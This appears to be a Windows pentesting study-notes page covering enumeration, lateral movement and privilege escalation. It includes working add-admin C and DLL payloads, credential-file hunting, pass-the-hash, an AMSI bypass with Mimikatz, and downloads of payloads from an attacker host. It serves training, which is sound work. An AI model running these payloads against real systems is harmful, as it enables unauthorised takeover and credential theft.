## Enumeration

>[!code]- User and group information
>Information about the current user
>```powershell
>C:\Users\dave> whoami /all
>```
>Other users and groups
>```powershell
>PS C:\Users\dave> Get-LocalUser
>PS C:\Users\dave> Get-LocalGroup
>```
>Members of a group:
>```powershell
>PS C:\Users\dave> Get-LocalGroupMember adminteam
>```

>[!code]- Machine information
>OS and architecture:
>```powershell
>PS C:\Users\dave> systeminfo
>```

>[!code]- Network information
>Network interfaces:
>```powershell
>PS C:\Users\dave> ipconfig /all
>```
>Routing table:
>```powershell
>PS C:\Users\dave> route print
>```
>Active network connections:
>```powershell
>PS C:\Users\dave> netstat -ano
>```
>Port scan:
>```powershell
>PS C:\Users\student> 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $\_)) "TCP port $_ is open"} 2>$null
>```
>Test one port (eg SMB):
>Port scan for an SMB server:
>```powershell
>PS C:\Users\student> Test-NetConnection -Port 445 192.168.50.151
>```

>[!code]- Installation applications
>32-bit applications:
>```powershell
>PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
>```
>64-bit applications:
>```powershell
>PS C:\Users\dave> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
>```
>32- and 64-bit applications:
>```powershell
>dir C:\Program Files
>```

>[!code]- Running processes
>Running processes:
>```powershell
>PS C:\Users\dave> Get-Process
>```

>[!code]- Files
>KeePass Files
>- Search for .kdbx files in the C: drive
>```powershell
>PS C:\Users\dave> Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue
>```
>___
>XAMPP configuration files (might contain default passwords)
>```powershell
>PS C:\Users\dave> Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse - ErrorAction SilentlyContinue
>```
>___
>Documents or text files in the home directory
>```powershell
PS C:\Users\dave> Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
>```

>[!code]- PowerShell logs
>See the PS history:
>```powershell
>PS C:\Users\dave> Get-History
>```
>___
>Another source is **PSReadLine**.
>
>First get the filepath for the PSReadLine history file:
>```powershell
>PS C:\Users\dave> (Get-PSReadlineOption).HistorySavePath
>```
>Then output the contents of that file:
>```powershell
>PS C:\Users\dave> type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
>```

>[!code]- Automated enumeration with [winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
## Privilege Escalation

>[!code]- Saved credentials `cmdkey /list`
>List any saved credentials:
>```powershell
C:\PrivEsc>cmdkey /list
>```
>Use a saved credential to run an executable:
>```powershell
C:\PrivEsc>runas /savecred /user:admin C:\PrivEsc\reverse.exe
>```
^69aecb
## Lateral Movement
#### Runas

>[!info]- Info - What is runas?
>Runas allows us to run a program as a different user. Runas can be used with local or domain accounts as long as the user has the ability to log on to the system.

>[!code]- Without an interactive shell - might be possible if there are [[Windows#^69aecb|saved credentials]]
^f6fbe8
>[!code]- With an interactive shell - spawn a cmd shell
>- **/user** to specify the username of the user
>  - **cmd** to start cmd shell
>```powershell
PS C:\Users\steve> runas /user:backupadmin cmd  
>```
^62cf05
#### New-PSSession

>[!info]- Info - What is New-PSSession?
>The _New-PSSession_ cmdlet allows one to 

>[!code]- Connect to another machine
>Connect to **192.168.50.73** as **jen**:
>```powershell
>PS C:\Users\jeff> $username = 'jen';  
>PS C:\Users\jeff> $password = 'Nexus123!';  
>PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext - Force;  
>PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
>
>PS C:\Users\jeff> New-PSSession -ComputerName 192.168.50.73 -Credential $credential
>PS C:\Users\jeff> Enter-PSSession 1
>```
#### Evil-WinRM

>[!warning]- Limitation - winrm must be enabled on the remote host (default port 5895 and 5896)

>[!code]- Connect to a Windows machine from Kali
>With a clear-text password
>(the backslashes are part of the command):
>```bash
>kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
>```
>With a NTLM hash:
>```bash
>kali@kali:~$ evil-winrm -i 192.168.50.220 -u daveadmin -p "32196B56FFE6F45E294117B91A83BF38!"
>```
>Load a script into memory while logging in:
>(Might need to bypass AMSI - more information [here](https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/)).
>```bash
>evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
>Bypass-4MSI
>Invoke-Mimikatz.ps1
>Invoke-Mimikatz
>```
## Exploits
#### Hijacking Service Binaries

>[!info]- Info - Services and their binary files
>Each Windows service has an associated binary file, which are executed when the service is started or transitioned into a running state.

>[!exploit]- Exploit - Insecure permissions on the service binary file
>If a service binary file has insecure permissions, we might be able to replace the file with a malicious one. This file is then executed when the service is restarted or the machine is rebooted. Upon restart, the malicious binary is executed with the privileges of the service, eg *LocalSystem*.

>[!code]- List the running services
>List the running services and the paths to their binaries:
>```powershell
>PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select
>Name,State,PathName | Where-Object {$_.State -like 'Running'}
>```
>This could also be done with:
>1. services.msc
>2. Get-Service cmdlet

>[!code]- Find a service binary with write permissions granted
>An example with no write permissions:
>```powershell
># dave only has Read and Execute (RX) rights on httpd.exe
>PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe" C:\xampp\apache\bin\httpd.exe
>	BUILTIN\Administrators:(F)
>	NT AUTHORITY\SYSTEM:(F)
>	BUILTIN\Users:(RX)
>	NT AUTHORITY\Authenticated Users:(RX)
>
>Successfully processed 1 files; Failed processing 0 files
>
>An example with full permissions (ie including write):
>PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe" C:\xampp\mysql\bin\mysqld.exe
>	NT AUTHORITY\SYSTEM:(F)
>	BUILTIN\Administrators:(F)
>	BUILTIN\Users:(F)
>
>Successfully processed 1 files; Failed processing 0 files
>```
>Other options include the PowerShell Cmdlet *Get-ACL*.

>[!code]- Create a malicious binary
>Create a malicious binary.
>
>The `adduser.c` binary will create a new *dave2* user and add them to the local Administrators group using the *system* function:
>>[!code]- adduser.c
>>```c
>>#include <stdlib.h>
>>
>>int main ()
>>{  
>>	int i;
>>	i = system ("net user dave2 password123! /add");  
>>	i = system ("net localgroup administrators dave2 /add");
>>	return 0;
>>}
>>```
>
>___
>Compile it.
>
>The target machine is 64-bit so we'll cross-compile the C code to a 64-bit application with **x86_64-w64-mingw32-gcc**.
>- **-o** to specify the name of the compiled executable
>```bash
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
>```

>[!code]- Transfer the malicious binary to the target machine.
>Transfer it ([[Transfer Files#Transfer to Windows|other options here]]):
>```powershell
>PS C:\Users\dave> iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
>```
>Move it to replace the original binary:
>```powershell
>PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe  
>PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
>```

>[!code]- Restart the service or reboot the machine
>>[!warning]- Limitation - restarting the service requires suitable permissions
>
>Check if the service Startup Type is set to "Automatic".
>(If so it should restart upon a reboot of the machine.)
>
>```powershell
>PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$\_.Name -like 'mysql'}
>
>Name StartMode
>---- ---------
>mysql Auto
>```
>
>Reboot the machine.
>- **/r** to reboot instead of shutdown
>- **/t 0** to reboot in zero seconds
>```powershell
>PS C:\Users\dave> shutdown /r /t 0
>```

>[!code]- Automate the exploit with PowerUp
>Transfer to the Windows machine ([[Transfer Files#Transfer to Windows|other methods here]]):
>```powershell
>PS C:\Users\dave> iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
>```
>Run PowerUp:
>```powershell
>PS C:\Users\dave> powershell -ep bypass
>PS C:\Users\dave> . .\PowerUp.ps1
>PS C:\Users\dave> Get-ModifiableServiceFile
>```
#### Hijacking Service DLLs

>[!info]- Info - The search order for a DLL
>The search order is defined by Microsoft and determines what to inspect first when searching for DLLs. The following list shows the ***standard*** search order:
>1. The directory from which the application loaded.
>2. The system directory.  
>3. The 16-bit system directory.  
>4. The Windows directory.
>5. The current directory.  
>6. The directories that are listed in the PATH environment variable.
>
>The ***safe search*** order causes the _current directory_ to be searched at position 2.

>[!exploit]- Exploit - A binary attempts to load a DLL that doesn't exist
>A binary might attempt to load a DLL that doesn't exist on the system. We can try placing a malicious DLL in a path of the DLL search order so it executes when then binary is started.
>
>We need to find all DLLs loaded by a target binary (service) as well as detect missing ones. Once done we could either:
>1. replace one with our own malicious DLL if we have write permissions
>2. provide our own malicious DLL if one is missing

>[!code]- Find a service binary using vulnerable DLLs
>List the running services and the paths to their binaries:
>```powershell
>PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select
>Name,State,PathName | Where-Object {$_.State -like 'Running'}
>```
>This could also be done with:
>1. services.msc
>2. Get-Service cmdlet

>[!code]- Search for a writeable or missing DLL for the service
>Either:
>1. Via the process monitor (requires GUI access and admin privileges)
>2. Via copying the target service binary to our Windows machine, installing the corresponding service on it, then use the Process Monitor
>___
>
>Via the process monitor.
>
>![[Pasted image 20240508043821.png]]
>
We might need to restart the service to get any results in Process Monitor:
>```powershell
>PS C:\Users\steve> Restart-Service BetaService
>```
>
>>[!success]- We find a DLL (**myDLL**) that cannot be found and is searched for in a location we have access to (ie. the home directory of Steve).

>[!code]- Create a malicious DLL to replace the original one
>Create it:
>(This will create a new user and add them to the administrators group).
>>[!code]- myDLL.cpp
>>```cpp
>>#include <stdlib.h>
>>#include <windows.h>
>>
>>BOOL APIENTRY DllMain(  
>>HANDLE hModule,// Handle to DLL module  
>>DWORD ul_reason_for_call,// Reason for calling function
>>LPVOID lpReserved ) // Reserved  
>>{
>>	switch ( ul_reason_for_call )
>>	{  
>>	case DLL_PROCESS_ATTACH: // A process is loading the DLL.  
>>		int i;  
>>		i = system ("net user dave2 password123! /add");  
>>		i = system ("net localgroup administrators dave2 /add");
>>		break;  
>>		case DLL_THREAD_ATTACH: // A process is creating a new thread.
>>		break;  
>>		case DLL_THREAD_DETACH: // A thread exits normally.  
>>		break;  
>>		case DLL_PROCESS_DETACH: // A process unloads the DLL.  
>>		break;
>>	}
>>	return TRUE;
>>}
>>```
>
>Compile it:
>```bash
>kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
>```

>[!code]- Transfer the malicious DLL to the target machine
>[[Transfer Files#Transfer to Windows|Options here]].

>[!code]- Restart the service
>```powershell
>PS C:\Users\steve\Documents> Restart-Service BetaService
>```
#### Unquoted Service Paths

>[!exploit]- Exploit - The service binary path contains a space
>If the file path to a service binary contains a space, the file path will be interpreted in various ways. For example, for the service binary path of **C:\Program Files\My Program\My Service\service.exe**, Windows uses the following order to try start the executable file:
>```powershell
>C:\Program.exe
>C:\Program Files\My.exe  
>C:\Program Files\My Program\My.exe  
>C:\Program Files\My Program\My service\service.exe
>```
>We can create a malicious executable and place it in a directory that corresponds with one of the possible file paths whilst matching its file name to the corresponding interpreted file name. For example: name our executable **Program.exe** and place it in **C:/**.

>[!code]- Find a suitable unquoted service path
>Enumerate running and stopped services:
>(Via Get-CimInstance or wmic)
>```powershell
>PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName
>
>C:\Users\steve> wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
>```
>___
>
>Ensure that we can stop/start the service:
>```powershell
>PS C:\Users\steve> Start-Service GammaService
>PS C:\Users\steve> Stop-Service GammaService
>```
>___
>
>Check we have write access for at least one of the possible paths:
>For:
>```powershell
>C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
>```
>We'd check:
>```powershell
>C:\Program.exe
>PS C:\Users\steve> icacls "C:\"
>
>C:\Program Files\Enterprise.exe
>PS C:\Users\steve> icacls "C:\Program Files"
>
>C:\Program Files\Enterprise Apps\Current.exe
>PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
># We have write access to the Enterprise Apps folder
>```

>[!code]- Create a malicious binary and move it to the chosen folder
>Create a binary.
>It creates a user and adds them to the admin group.
>>[!code]- adduser.c
>>```c
>>#include <stdlib.h>
>>
>>int main ()
>>{  
>>	int i;
>>	i = system ("net user dave2 password123! /add");  
>>	i = system ("net localgroup administrators dave2 /add");
>>	return 0;
>>}
>>```
>___
>Compile it.
>
>The target machine is 64-bit so we'll cross-compile the C code to a 64-bit application with **x86_64-w64-mingw32-gcc**.
>- **-o** to specify the name of the compiled executable
>```bash
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
>```
>___
>Transfer the binary to the victim machine. See options [[Transfer Files#Transfer to Windows|here]].
>___
>Copy the binary to the chosen folder:
>```powershell
>PS C:\Users\steve> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
>```

>[!code]- Restart the service
>Restart:
>```powershell
>PS C:\Users\steve> Start-Service GammaService
>```
>___
>The service should restart and execute the malicious binary, because it will look for it in the folder we placed it before it looks for the original authenticate binary.

>[!code]- Automate the exploit with PowerUp
>If successful, PowerUp will create a new local user called john with the password **Password123!**. The user is then added to the local Admin group.
>```powershell
>PS C:\Users\dave> Get-UnquotedService
>PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
>```
#### Scheduled Tasks

>[!info]- Info - What are scheduled tasks?
>Scheduled Tasks are used to execute various automated tasks, like clean-up activities and update management. These tasks have one or more triggers, which when met cause an action.

>[!exploit]- Exploit - a scheduled task could allow code execution as a privileged user

>[!code]- Find a vulnerable scheduled task
>We are looking for the following three things:
>1. The task is executed as a higher privileged user
>2. The task will be triggered soon
>3. When triggered the task will execute something we can take advantage of.
>___
>View the scheduled tasks:
>```powershell
>Get-ScheduledTask  # PowerView
>PS C:\Users\steve> schtasks /query /fo LIST /v
>```
>We find a task that will execute the following binary `C:\Users\steve\Pictures\BackendCacheCleanup.exe`.

>[!code]- Exploit the found scheduled task
>Check if we have write access to the **Picture** folder: 
>```powershell
>PS C:\Users\steve> icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
>C:\Users\steve\Pictures\BackendCacheCleanup.exe
>	NT AUTHORITY\SYSTEM:(I)(F)
>	BUILTIN\Administrators:(I)(F)
>	CLIENTWK220\steve:(I)(F)
>	CLIENTWK220\offsec:(I)(F)
>```
>___
>Create a malicious binary:
>It creates a user and adds them to the admins group.
>>[!code]- adduser.c
>>```c
>>#include <stdlib.h>
>>
>>int main ()
>>{  
>>	int i;
>>	i = system ("net user dave2 password123! /add");  
>>	i = system ("net localgroup administrators dave2 /add");
>>	return 0;
>>}
>>```
>
>___
>Compile it (ensure 64-bit compiler is correct):
>```bash
>kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
>```
>___
>Transfer it to the victim machine. See options [[Transfer Files#Transfer to Windows|here]].
>___
>Replace it with the original binary and wait for the scheduled tasks to execute it:
>```powershell
>PS C:\Users\steve> move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
>PS C:\Users\steve> move .\BackendCacheCleanup.exe .\Pictures\
>```
#### PrintSpoofer Exploit

>[!warning] Limitation - Requires SeImpersonatePrivilege

>[!info]- Info - What are named pipes?
>Named pipes are one way for local or remote _Inter-Process Communication_ in Windows. They allow two unrelated processes to share data with each other. A named pipe server can create a named pipe to which a named pipe client can connect via the specified name.

>[!exploit]- Exploit - Force a privileged user to connect to a named pipe to steal their authentication details
>Once a client has connected to the named pipe, the server can leverage _SeImpersonatePrivilege_ to impersonate this client after capturing their authentication details from the connection process.

>[!code]- Run PrintSpoofer
>Check we have the SeImpersonatePrivilege:
>```powershell
>whoami /priv
>```
>___
>Download printspoofer:
>```bash
>kali@kali:~$ wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
>```
>Transfer it to the victim. See options [[Transfer Files#Transfer to Windows|here]].
>___
>Run it on the victim:
>- **-c** to specify the command we want to execute (powershell)
>- **-i** to interact with the process in the current command prompt
>```powershell
>PS C:\Users\dave> .\PrintSpoofer64.exe -i -c powershell.exe
>```
>![[Pasted image 20240509045405.png]]
#### Other SeImpersonatePrivilege Exploits

>[!exploit] Exploit
>There are other variants from the [_Potato_](https://jlajara.gitlab.io/Potatoes_Windows_Privesc) family to try, eg:
>- RottenPotato
>- SweetPotato
>- JuicyPotato
